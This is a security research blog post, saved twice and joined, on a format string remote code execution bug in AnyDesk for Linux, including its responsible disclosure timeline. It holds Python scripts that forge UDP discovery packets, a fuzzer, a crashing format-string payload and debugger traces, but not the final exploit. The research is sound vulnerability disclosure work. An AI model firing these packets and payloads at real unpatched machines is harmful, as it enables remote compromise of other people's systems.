Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_4455e671_20250119_142605.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

